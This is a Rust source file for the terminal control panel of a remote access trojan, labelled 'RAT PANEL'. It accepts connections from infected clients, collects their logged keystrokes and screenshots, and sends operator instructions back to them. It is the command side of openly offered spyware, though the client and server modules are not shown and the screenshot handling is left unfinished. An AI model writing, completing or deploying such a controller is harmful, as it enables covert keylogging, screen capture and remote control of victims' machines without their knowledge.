mod app;
mod ui;
mod server;

use app::App;
use color_eyre::Result;
use std::error::Error;
use std::io;
use std::time::{Duration, Instant};

use crossterm::event::{self, DisableMouseCapture, EnableMouseCapture, KeyCode, Event, EventStream};
use crossterm::execute;
use crossterm::terminal::{
    EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode,
};
use ratatui::Terminal;
use ratatui::backend::{Backend, CrosstermBackend};

use ratatui_image::{
    thread::{ThreadProtocol, ResizeRequest},
    picker::Picker,
};

use tokio::sync::mpsc::{self, UnboundedReceiver};
use image::ImageReader;
use futures::{FutureExt, StreamExt};

use crate::server::ClientEvent;

pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let (tx, rx) = mpsc::unbounded_channel::<ResizeRequest>();
    let protocol = Picker::from_query_stdio()?
        .new_resize_protocol(ImageReader::open("D:/фото/DSCN4215.jpg")?.decode()?);

    let app = App::new(" ◈ RAT PANEL ", ThreadProtocol::new(tx, Some(protocol)));
    let app_result = run_app(&mut terminal, app, tick_rate, rx).await;

    disable_raw_mode()?;
    execute!(
        terminal.backend_mut(),
        LeaveAlternateScreen,
        DisableMouseCapture
    )?;
    terminal.show_cursor()?;

    if let Err(err) = app_result {
        println!("{err:?}");
    }

    Ok(())
}

fn handle_request(app: &mut App, request: ResizeRequest) -> Result<()> {
    app.screenshot
        .update_resized_protocol(request.resize_encode()?);
    Ok(())
}

fn handle_client_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
    match event {
        ClientEvent::Connected(addr) => { app.client_addr = addr.to_string() },
        ClientEvent::Data(mut bytes) => { 
            if bytes.ends_with(b"keystroke_reader") {
                bytes.truncate(bytes.len() - b"keystroke_reader".len());
                let key = std::str::from_utf8(&bytes)?;
                app.logged_keys.push_str(key);
            } else if bytes.ends_with(b"screenshot") {
                bytes.truncate(bytes.len() - b"screenshot".len());
                
            }   
        },  
        ClientEvent::Disconnected => { app.client_addr = String::new() },
    }

    Ok(())
}

async fn handle_app_event(app: &'_ mut App<'_>, event: Result<Event, std::io::Error>) -> Result<(), Box<dyn Error>> {
    if let Some(key_event) = event?.as_key_press_event() {
        match key_event.code {
            KeyCode::Tab => app.on_right(),
            KeyCode::BackTab => app.on_left(),
            KeyCode::Backspace => app.delete_char(),
            KeyCode::Enter => app.submit_instructions().await,    
            KeyCode::Left => app.move_cursor_left(),
            KeyCode::Right => app.move_cursor_right(),
            KeyCode::Char(to_insert) => app.enter_char(to_insert),
            KeyCode::Esc => return Ok(()),
            _ => {}
        }
    }

    Ok(())
}

async fn run_app<B: Backend>(
    terminal: &mut Terminal<B>,
    mut app: App<'_>,
    tick_rate: Duration,
    mut rx: UnboundedReceiver<ResizeRequest>,
) -> Result<(), Box<dyn Error>>
where
    B::Error: 'static,
{
    let mut event_stream = EventStream::new();
    let mut last_tick = Instant::now();
    loop {
        terminal.draw(|frame| ui::render(frame, &mut app))?;

        tokio::select! {
            Some(request) = rx.recv() => handle_request(&mut app, request)?,
            Some(client_event) = app.client.app_receiver.recv() => handle_client_event(&mut app, client_event)?,
            Some(event) = event_stream.next().fuse() => handle_app_event(&mut app, event).await?,
        }
        
        let timeout = tick_rate.saturating_sub(last_tick.elapsed());
        if !event::poll(timeout)? {
            app.on_tick();
            last_tick = Instant::now();
            continue;
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let rt = tokio::runtime::Runtime::new()?;
    let _guard = rt.enter();

    let tick_rate = Duration::from_millis(250);
    run(tick_rate).await?;
    Ok(())
}
